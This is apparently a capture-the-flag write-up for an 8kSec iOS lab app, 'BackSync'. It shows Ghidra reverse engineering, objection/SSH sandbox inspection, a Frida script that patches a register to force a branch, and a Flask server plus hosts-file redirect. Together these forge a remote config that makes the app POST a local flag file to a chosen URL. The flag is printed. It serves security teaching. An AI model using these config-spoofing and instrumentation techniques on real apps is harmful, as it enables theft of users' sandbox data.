---
title: BackSync - 8kSec
date: 2025-9-1 00:00:00 +/-TTTT
categories: [8kSec]
tags: [8kSec, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase
---

<br />

**Description:**

**BackSync** appears to be a straightforward profile viewer with minimal functionality. However, beneath its unassuming interface lies a background process that periodically fetches remote configurations. These configurations can influence the app’s behavior in unexpected ways.

<br />

**Objective:**

- Investigate the app’s background activities and determine how to manipulate its behavior to your advantage.
- Analyze the app to understand its configuration fetching mechanism. Craft a remote configuration that causes the app to perform an unintended action, leading to the retrieval of the hidden flag **remotely**.

<br />

**Restrictions:**

The flag resides in a local file within the app’s sandbox.

<br />

**Explore the application**

When the app launches, it displays a screen titled **“My Profile”** with two buttons  **“Log In”** and **“My Profile”**, but neither of these buttons performs any action.

![](/assets/img/8ksec/BackSync /1.jpg)

<br />

I noticed that the app periodically sends HTTP GET requests to a domain that changes each time the app is launched. The domain name always starts with three varying characters followed by **"deletedoldstagingsite.com"**.

![](/assets/img/8ksec/BackSync /1.png)

<br />

**Reverse Engineering With Ghidra**

Each time I launch the app, I observed that two functions are executed:

- **`_$s8BackSync18writeFlagToSandboxyyF()`**
- **`_$s8BackSync29fetchRemoteConfigPeriodicallyyyF()`**

These functions run automatically on every app startup.

![](/assets/img/8ksec/BackSync /4.png)

<br />

The `writeFlagToSandbox()` function creates a file named **flag.txt** and saves it in the app’s **Documents** directory.

![](/assets/img/8ksec/BackSync /2.png)

<br />

![](/assets/img/8ksec/BackSync /3.png)

<br />

We can verify that the flag exists in the app’s **Documents** directory by connecting to the iPhone via SSH and inspecting that directory.

```
└─# objection -g com.8ksec.BackSync.W46SY5ZJ6Z explore  
Checking for a newer version of objection...
Using USB device `iOS Device`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
com.8ksec.BackSync.W46SY5ZJ6Z on (iPhone: 16.0) [usb] # env

Name               Path
-----------------  --------------------------------------------------------------------------------------------
BundlePath         /private/var/containers/Bundle/Application/1F870E8C-2885-4AAC-AB2E-3290F1B6717B/BackSync.app
CachesDirectory    /var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Library

```

<br />

```
iPhone:~ root# cd /var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Documents
iPhone:/var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Documents root# ls
flag.txt
iPhone:/var/mobile/Containers/Data/Application/04A6B26B-B465-4336-9621-FD99F384164F/Documents root# cat flag.txt 
FLAG{you_remotely_triggered_the_leak}                                                       
```

<br />

The `fetchRemoteConfig` function is responsible for sending the GET request to **deletedoldstagingsite.com**.

![](/assets/img/8ksec/BackSync /8.png)

<br />

The function located at offset **0x5370** parses JSON data from the HTTP response, converts it into a `[String: String]` dictionary, checks the fields **"mode"**, **"collect_logs"**, and **"target_url"**, and calls **`BackSync.sendFlag(to:)`** if all the required conditions are met.

<br />

![](/assets/img/8ksec/BackSync /9.png)

<br />

![](/assets/img/8ksec/BackSync /10.png)

<br />

At address **0x00005770**, the instruction

```assembly
tbnz w8, #0x0, LAB_000057a4
```

means **“Test Bit and Branch if Non-Zero.”** It checks bit **0** of the **w8** register.
 If that bit is **1**, the program **branches to `LAB_000057a4`**; otherwise, it continues to the next instruction.

The next instruction at **0x00005774**,

```assembly
b LAB_0000587c
```

is an unconditional branch that jumps to **`LAB_0000587c`**, effectively skipping the `LAB_000057a4` branch if the bit test fails.

The label **`LAB_000057a4`** represents the **branch where the `sendFlagTo()` function is called**, so for execution to reach that function, **the w8 register must have its least significant bit (bit 0) set to 1**.

<br />

![](/assets/img/8ksec/BackSync /5.png)

<br />

A Frida script that forces the register **x8** (w8) to `1` so the instruction
 `tbnz w8, #0x0, LAB_000057a4`
 succeeds and execution jumps to `LAB_000057a4`,  the branch that calls `sendFlagTo()`.

```javascript
var offset = ptr('0x5770');
var t_module = 'BackSync.debug.dylib';
var base = Module.getBaseAddress(t_module);
if (base === null) {
    throw new Error('Module not found: ' + t_module);
}

var target = base.add(offset);

Interceptor.attach(target, {
    onEnter: function (args) {
    	this.context.x8 = ptr(0x1);
    }
});
```

<br />

This Python script creates a simple **Flask web server** that provides a mock **remote configuration API endpoint**. When the server is running, it listens on port **80** for incoming HTTP GET requests. The route **`/remoteConfig`** is defined to return a JSON response that simulates the kind of configuration data the app’s `fetchRemoteConfig` function expects. Specifically, it sends a JSON object containing three keys: `"mode"` (set to `"test"`), `"collect_logs"` (set to `"true"` to enable log collection), and `"target_url"` (set to `"http://google.com"`, representing the destination URL for the flag). When a client, such as the app, makes a GET request to `/remoteConfig`, the server responds with this JSON payload. 

```python
from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/remoteConfig', methods=['GET'])
def get_remote_config():
    response = {
        "mode": "test",
        "collect_logs": "true",
        "target_url":"http://google.com"
    }
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
```

<br />

run the python server

```
python3 main.py
```

<br />

Start the app with frida, identify the domain it requests (the one that looks like `<XXX>deletedoldstagingsite.com`), and add a hosts entry mapping that domain to localhost:

```
127.0.0.1  <XXX>deletedoldstagingsite.com
```

<br />

The app sends a request to `<XXX>deletedoldstagingsite.com`, receives the expected JSON response, and then sends a POST to the URL specified in `"target_url"`, with the flag included in the request body.

![](/assets/img/8ksec/BackSync /6.png)

<br />

![](/assets/img/8ksec/BackSync /7.png)

<br />

**Flag:** FLAG{you_remotely_triggered_the_leak}
